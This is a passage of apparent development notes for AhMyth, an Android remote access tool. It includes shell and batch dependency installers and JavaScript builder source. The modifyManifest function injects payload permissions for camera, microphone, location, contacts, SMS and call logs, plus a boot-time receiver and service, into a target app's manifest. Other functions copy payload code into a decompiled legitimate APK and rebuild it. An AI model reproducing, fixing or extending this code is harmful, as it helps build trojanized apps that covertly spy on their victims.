            # Banner text
            banner_text="   AhMyth"
           
            # Use figlet to create ASCII art with mono9 font
            figlet_output=$(figlet -f mono9 "$banner_text")

            # Use lolcat to add color to the ASCII art
            banner_output=$(echo "$figlet_output")

            # Print the result
            echo "${blue}${banner_output}${reset_color}"

        fi
    fi
}

# Get the path to the script's directory
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# String color codes
reset_color="\033[0m"
red="\033[31m"
green="\033[32m"
yellow="\033[33m"

# Check package manager
if [ -x "$(command -v apt-get)" ]; then
    PACKAGE_MANAGER="apt-get"
elif [ -x "$(command -v pacman)" ]; then
    PACKAGE_MANAGER="pacman"
else
    echo "${red}[x] Unsupported package manager.\nThis script currently supports APT and Pacman-based systems.${reset_color}"
    exit 1
fi

java_install() {
    echo "${yellow}[i] Installing default JDK...${reset_color}\n"
    if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
        apt-get install -y default-jdk
    elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
        pacman -Sy jdk-openjdk
    fi
    echo "\n${green}[✔] Default JDK has been installed successfully.${reset_color}"
    sleep 2
}

nodejs_install() {
    echo "${yellow}[i] Installing Node.js...${reset_color}\n"
    if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
        apt-get install -y nodejs
    elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
        pacman -Sy nodejs
    fi
    echo "\n${green}[✔] Node.js has been installed successfully.${reset_color}"
    sleep 2
    clear
}

npm_install() {
    echo "${yellow}[i] Installing npm...${reset_color}\n"
    if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
        apt-get install -y npm
    elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
        pacman -Sy npm
    fi
    echo "\n${green}[✔] npm has been installed successfully.${reset_color}"
    sleep 2
    clear
}

git_install() {
    echo "${yellow}[i] Installing Git...${reset_color}\n"
    if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
        apt-get install -y git
    elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
        pacman -Sy git
    fi
    echo "\n${green}[✔] Git has been installed successfully.${reset_color}"
    sleep 2
    clear
}

create_system_shortcut() {
    # Create ahmyth file and grant executable permissions
    echo "${yellow}[i] Creating ahmyth file and granting executable permissions...${reset_color}\n"
    echo '#!/bin/sh' > ahmyth
    echo "if [ \"\$(id -u)\" = \"0\" ]; then" >> ahmyth
    echo "    npx electron \"$SCRIPT_DIR/app\" --no-sandbox start" >> ahmyth
    echo "else" >> ahmyth
    echo "    npm start --prefix \"$SCRIPT_DIR\"" >> ahmyth
    echo "fi" >> ahmyth
    chmod +x ahmyth
    sleep 2
    clear

    # Move ahmyth file to /usr/local/sbin
    echo "${yellow}[i] Moving ahmyth file to /usr/local/sbin...${reset_color}\n"
    if [ -d "/usr/local/sbin" ]; then
        mv ahmyth /usr/local/sbin
        echo "\n${green}[✔] ahmyth file has been moved to /usr/local/sbin."
    else
        echo "${red}[x] /usr/local/sbin directory not found! Unable to move ahmyth file.${reset_color}"
    fi
    sleep 2
    clear
}

# Check if user is root
if [ "$(id -u)" != "0" ]; then
    clear
    echo "${red}[x] This script must be run as root!${reset_color}" >&2
    exit 1
fi

# Run the function
clear
create_3d_banner
sleep 2

# Update and upgrade
clear
echo "${yellow}[i] Updating and Upgrading...${reset_color}\n"
if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
    apt-get update #&& apt-get upgrade -y
elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
    pacman -Syu --noconfirm
fi
echo "\n${green}[✔] Update and Upgrade done.${reset_color}"
sleep 2
clear

# Check if any version of java 8 through 21 is installed
if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
    if [ -z "$(dpkg -l | grep openjdk- | grep -E '8|9|10|11|12|13|14|15|16|17|18|19|20|21')" ]; then
        echo "${red}[x] Java is not installed!${reset_color}\n"
        java_install
    fi
elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
    if ! pacman -Qi jdk-openjdk >/dev/null 2>&1; then
        echo "${red}[x] Java is not installed!${reset_color}\n"
        java_install
    fi
fi

# Check if nodejs is installed
if [ -z "$(command -v node)" ]; then
    echo "${red}[x] Node.js is not installed!${reset_color}\n" >&2
    nodejs_install
fi

# Check if npm is installed
if [ -z "$(command -v npm)" ]; then
    echo "${red}[x] npm is not installed!${reset_color}\n" >&2
    npm_install
fi

# Check if git is installed
if [ -z "$(command -v git)" ]; then
    echo "${red}[x] Git is not installed!${reset_color}\n" >&2
    git_install
fi

# Check if ahmyth system shortcut exists, create it if not
if [ -z "$(command -v ahmyth)" ]; then
    echo "${red}[x] ahmyth system shortcut doesn't exist!${reset_color}\n"
    create_system_shortcut
fi

# Check if all dependencies are installed
if [ -x "$(command -v node)" ] && [ -x "$(command -v npm)" ] && [ -x "$(command -v git)" ] && [ -f "/usr/local/sbin/ahmyth" ]; then
    echo "${green}[✔] All Dependencies are Installed, Exiting.${reset_color}"
    exit 0
fi
```
</details>
<br></br>

## `"modifyManifest"` function.
> Needs to be updated to insert the camera feature permissions in the right place regardless if there are any `<uses-feature />` tags present.
>> This function currently contains a bug that makes a mess of certain Android Manifest files when formatting them after inserting payload permissions, service and receiver, I believe that it may be to do with Manifests that use the `<queries />` tag.
<details>
    <Summary>Code</Summary>

```javascript
    $appCtrl.modifyManifest = (data, callback) => {
        var checkBoxofCamera = document.getElementById("Permissions1");
        var checkBoxofStorage = document.getElementById("Permissions2");
        var checkBoxofMic = document.getElementById("Permissions3");
        var checkBoxofLocation = document.getElementById("Permissions4");
        var checkBoxofContacts = document.getElementById("Permissions5");
        var checkBoxofSms = document.getElementById("Permissions6");
        var checkBoxofCallsLogs = document.getElementById("Permissions7");

        // default permissions for the payload
        const permissions = CONSTANTS.permissions;

        // Create an array to store the selected permissions
        var selectedPermissions = [];

        // Check each checkbox and add the corresponding permission to the selectedPermissions array
        if (checkBoxofCamera.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions1);
        }
        if (checkBoxofStorage.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions2);
        }
        if (checkBoxofMic.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions3);
        }
        if (checkBoxofLocation.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions4);
        }
        if (checkBoxofContacts.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions5);
        }
        if (checkBoxofSms.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions6);
        }
        if (checkBoxofCallsLogs.checked) {
            selectedPermissions.push(...CONSTANTS.checkboxMap.Permissions7);
        }

        // If all checkboxes are checked, set selectedPermissions to default permissions array from CONSTANTS
        if (
            checkBoxofCamera.checked &&
            checkBoxofStorage.checked &&
            checkBoxofMic.checked &&
            checkBoxofLocation.checked &&
            checkBoxofContacts.checked &&
            checkBoxofSms.checked &&
            checkBoxofCallsLogs.checked
        ) {
            selectedPermissions = permissions;
        }

        // If all checkboxes are unchecked, set selectedPermissions to default permissions array from CONSTANTS
        if (
            !checkBoxofCamera.checked &&
            !checkBoxofStorage.checked &&
            !checkBoxofMic.checked &&
            !checkBoxofLocation.checked &&
            !checkBoxofContacts.checked &&
            !checkBoxofSms.checked &&
            !checkBoxofCallsLogs.checked
        ) {
            selectedPermissions = permissions;
        }

        delayedLog('[★] Parsing the Android Manifest XML Data...');

        // Convert data to a string if it's not already a string
        if (typeof data !== 'string') {
            data = data.toString();
        }

        xml2js.parseString(data, {
            explicitArray: false
        }, (err, result) => {
            if (err) {
                const callbackErrors = [
                    '[x] Unable to Parse the Android Manifest XML Data!',
                    '[¡] Error written to "Parsing.log" on ' + CONSTANTS.logStatus.INFO,
                    logPath,
                ];
                writeErrorLog(err, 'Parsing.log');
                callback({
                    message: callbackErrors[0],
                    callbackErrors,
                });
                return;
            }

            const manifestObj = result.manifest;

            // Check if receiver and service properties are arrays
            if (!Array.isArray(manifestObj.application.receiver)) {
                manifestObj.application.receiver = manifestObj.application.receiver ? [manifestObj.application.receiver]: [];
            }

            if (!Array.isArray(manifestObj.application.service)) {
                manifestObj.application.service = manifestObj.application.service ? [manifestObj.application.service]: [];
            }

            // store existing permissions
            const existingPermissions = new Set();

            // Check if permissions already exist in the manifest
            if (manifestObj['uses-permission']) {
                if (!Array.isArray(manifestObj['uses-permission'])) {
                    manifestObj['uses-permission'] = [manifestObj['uses-permission']];
                }
                manifestObj['uses-permission'].forEach((permission) => {
                    existingPermissions.add(permission.$['android:name']);
                });
            } else {
                manifestObj['uses-permission'] = [];
            }

            // Check if features already exist in the manifest
            if (manifestObj['uses-feature']) {
                if (!Array.isArray(manifestObj['uses-feature'])) {
                    manifestObj['uses-feature'] = [manifestObj['uses-feature']];
                }
                manifestObj['uses-feature'].forEach((feature) => {
                    existingPermissions.add(feature.$['android:name']);
                });
            } else {
                manifestObj['uses-feature'] = [];
            }

            // Filter selected permissions to exclude duplicates
            const filteredPermissions = selectedPermissions.filter((permission, index, self) => {
                return self.indexOf(permission) === index && !existingPermissions.has(permission);
            });

            delayedLog('[★] Injecting AhMyth Payload Permissions...');

            // Add new permissions and features based on filteredPermissions
            filteredPermissions.forEach(permission => {
                if (permission === 'android.hardware.camera') {
                    manifestObj['uses-feature'].push({
                        $: {
                            'android:name': 'android.hardware.camera'
                        },
                        _: '' // Add empty string as element text
                    });
                }

                if (permission === 'android.hardware.camera.autofocus') {
                    manifestObj['uses-feature'].push({
                        $: {
                            'android:name': 'android.hardware.camera.autofocus'
                        },
                        _: '' // Add empty string as element text
                    });
                }

                if (permission !== 'android.hardware.camera' && permission !== 'android.hardware.camera.autofocus') {
                    manifestObj['uses-permission'].push({
                        $: {
                            'android:name': permission
                        },
                        _: '' // Add empty string as element text
                    });
                }
            });

            delayedLog('[★] Injecting AhMyth Payload Service and Receiver...');

            // Construct the receiver and service tags using constants
            const receiverTag = {
                $: {
                    'android:enabled': 'true',
                    'android:exported': 'true',
                    'android:name': CONSTANTS.ahmythReceiver,
                },
                'intent-filter': {
                    action: {
                        $: {
                            'android:name': 'android.intent.action.BOOT_COMPLETED',
                        },
                    },
                },
            };

            const serviceTag = {
                $: {
                    'android:enabled': 'true',
                    'android:exported': 'false',
                    'android:name': CONSTANTS.ahmythService,
                },
            };

            // Add the receiver and service tags to the application node
            manifestObj.application.receiver.push(receiverTag);
            manifestObj.application.service.push(serviceTag);

            const builder = new xml2js.Builder({
                renderOpts: {
                    pretty: true,
                    indent: '    '
                },
                headless: true
            });

            // Modify the parsed object by finding and updating the closing application tag
            const closingAppTag = '</application>';
            const modifiedClosingAppTag = '\n  </application>';
            const xmlString = builder.buildObject(result);
            const modifiedXml = xmlString.replace(closingAppTag,
                modifiedClosingAppTag);

            // Find the closing manifest tag and replace it with a new closing tag (without the extra newline)
            const closingManifestTag = '</manifest>';
            const finalModifiedXml = modifiedXml.replace(closingManifestTag,
                '</manifest>');

            callback(null,
                finalModifiedXml);
        });
    };
```
</details>
<br></br>

## `createPayloadDirectory` function and `copyAhmythFilesAndGenerateApk` function
> Needs to be updated to fix further *Unsigned Short Value Out of Range* errors with apktool
<details>
  <summary>Code</summary>

```js
    $appCtrl.createPayloadDirectory = (files) => {
        var ignoreDirs = ['original',
            'res',
            'build',
            'kotlin',
            'lib',
            'assets',
            'META-INF',
            'unknown',
            'smali_assets'];
        var smaliList = files.filter((item) => item.isDirectory() && !(ignoreDirs.includes(item.name))).map((item) => item.name);
        var collator = new Intl.Collator([], {
            numeric: true
        });
        smaliList.sort((a, b) => collator.compare(a, b));
        var lastSmali = smaliList[smaliList.length - 1];

        if (lastSmali == "smali") {
            payloadSmaliFolder = '/smali_classes2';
            return payloadSmaliFolder;
        } else {
            var extractSmaliNumber = lastSmali.match(/[a-zA-Z_]+|[0-9]+/g);
            var lastSmaliNumber = parseInt(extractSmaliNumber[1]);
            var newSmaliNumber = lastSmaliNumber + 1;
            var payloadSmaliFolder = '/smali_classes' + newSmaliNumber;
            return payloadSmaliFolder;
        }
    };

    // function to copy ahmyth source files to the orginal app
    // and if success go to generate the apk
    $appCtrl.copyAhmythFilesAndGenerateApk = (apkFolder) => {

        delayedLog('[★] Reading the Decompiled Original Application...')
        fs.readdir(apkFolder, {
            withFileTypes: true
        }, (error, files) => {
            if (error) {
                delayedLog('[x] Failed to Read the Decompiled Original Application!', CONSTANTS.logStatus.FAIL);
                writeErrorLog(error, 'Reading.log');
                delayedLog('[¡] Error written to "Reading.log" on ', CONSTANTS.logStatus.INFO);
                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                return;
            }

            const payloadSmaliFolder = $appCtrl.createPayloadDirectory(files);
            const targetPayloadFolder = dir.join(apkFolder, payloadSmaliFolder);

            delayedLog(`[★] Creating the ${payloadSmaliFolder} Directory...`);
            fs.mkdir(targetPayloadFolder, {
                recursive: true
            }, (error) => {
                if (error) {
                    delayedLog(`[x] Unable to Create the ${payloadSmaliFolder} Directory!`, CONSTANTS.logStatus.FAIL);
                    return;
                }

                delayedLog(`[★] Copying Payload Files to the ${payloadSmaliFolder} Directory...`);
                fs.copy(dir.join(CONSTANTS.ahmythApkFolderPath, "smali"), targetPayloadFolder, {
                    overwrite: true
                }, (error) => {
                    if (error) {
                        delayedLog('[x] Copying Failed!', CONSTANTS.logStatus.FAIL);
                        writeErrorLog(error, 'Copying');
                        delayedLog('[¡] Error written to "Copying.log" on', CONSTANTS.logStatus.INFO);
                        delayedLog(logPath, CONSTANTS.logStatus.INFO);
                        return;
                    }

                    // Copy android directory to the smali folder in the apkFolder
                    fs.copy(dir.join(targetPayloadFolder, 'android'), dir.join(apkFolder, 'smali', 'android'), {
                        overwrite: true
                    }, (error) => {
                        if (error) {
                            delayedLog('[x] Copying "android" directory failed!', CONSTANTS.logStatus.FAIL);
                            writeErrorLog(error, 'Copying "android" directory');
                            delayedLog('[¡] Error written to "Copying.log" on', CONSTANTS.logStatus.INFO);
                            delayedLog(logPath, CONSTANTS.logStatus.INFO);
                            return;
                        }

                        // Copy androidx directory to the smali folder in the apkFolder
                        fs.copy(dir.join(targetPayloadFolder, 'androidx'), dir.join(apkFolder, 'smali', 'androidx'), {
                            overwrite: true
                        }, (error) => {
                            if (error) {
                                delayedLog('[x] Copying "androidx" directory failed!', CONSTANTS.logStatus.FAIL);
                                writeErrorLog(error, 'Copying "androidx" directory');
                                delayedLog('[¡] Error written to "Copying.log" on', CONSTANTS.logStatus.INFO);
                                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                                return;
                            }

                            // Remove the original 'android' and 'androidx' directories
                            fs.rmdir(dir.join(targetPayloadFolder, 'android'), {
                                recursive: true
                            });
                            fs.rmdir(dir.join(targetPayloadFolder, 'androidx'), {
                                recursive: true
                            });

                            // Continue with Apk generation
                            $appCtrl.GenerateApk(apkFolder);
                        });
                    });
                });
            });
        });
    }
```
</details>
<br>

## Updated `autoinstall_win.bat` file.
> Makes use of the Windows Package Manager "Chocolatey" to automate installing external AhMyth Dependencies
>> Needs to be updated to look cleaner, present messages longer, check for `npm` as well as to see if any version of Java 8 through Java 21 is installed
<details>
    <summary>Updated "autoinstall_win.bat" file</summary>

```batch
@echo off

REM Step 1: Check for Chocolatey
echo [i] Checking to see if the Windows Package Manager "Chocolatey" is installed....
choco -? >nul 2>&1
if %errorlevel% neq 0 (
    echo [x] The Windows Package Manager "Chocolatey" is not installed on your system. This script requires "Chocolatey" to operate further, please install it.
    exit /b
) else (
    echo [Success] The Windows Package Manager "Chocolatey" is installed, proceeding....
)

REM Step 2: Check for Java installation
echo [i] Checking to see if Java is installed....
java -version >nul 2>&1
if %errorlevel% neq 0 (
    echo [i] Installing Java 17....
    choco install -y openjdk17
) else (
    echo [Success] Java is installed, proceeding....
)

REM Step 3: Check for Node.js and npm
echo [i] Checking to see if Node.js and npm are installed....
where node >nul 2>&1
if %errorlevel% neq 0 (
    echo [i] Installing Node.js and npm....
    choco install -y nodejs
) else (
    echo [Success] Node.js is installed, proceeding....
)

exit /b
```
</details>

